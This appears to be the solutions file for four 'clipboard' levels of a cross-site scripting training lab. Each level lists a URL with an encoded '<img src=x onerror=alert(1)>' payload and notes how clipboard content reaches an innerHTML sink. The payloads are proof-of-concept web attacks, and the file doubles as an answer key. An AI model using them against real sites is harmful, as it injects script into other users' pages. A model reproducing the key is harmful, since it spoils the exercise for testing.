# clipboard — solutions

Clipboard-mediated sinks: the seed is JSON-escaped into a JS prefix string, then concatenated with clipboard content and written via innerHTML. Triggering requires the user paste/copy interaction described per level.

### clipboard-level1

`/clipboard/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: prefix JSON-escaped then concatenated with pasted HTML and innerHTML'd — fires on paste

### clipboard-level2

`/clipboard/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: prefix + clipboard.readText() → innerHTML on click of #b

### clipboard-level3

`/clipboard/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: setData('text/html', PAYLOAD) on copy — fires in a target page that innerHTMLs pasted text/html

### clipboard-level4

`/clipboard/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: ClipboardItem text/html written on click — fires in any paste-handling consumer page
